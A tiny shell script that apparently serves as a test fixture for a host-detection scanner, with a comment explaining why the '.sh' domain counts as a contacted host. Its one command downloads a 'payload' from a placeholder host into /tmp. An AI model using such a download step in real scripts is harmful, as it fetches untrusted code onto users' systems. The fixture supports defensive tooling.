#!/bin/sh
# `.sh` is also a country TLD. Here the name is in authority position, after the
# scheme and before any `/`, so it is a real contacted host and must be reported.
curl -sSL https://cdn.example.sh/payload -o /tmp/payload
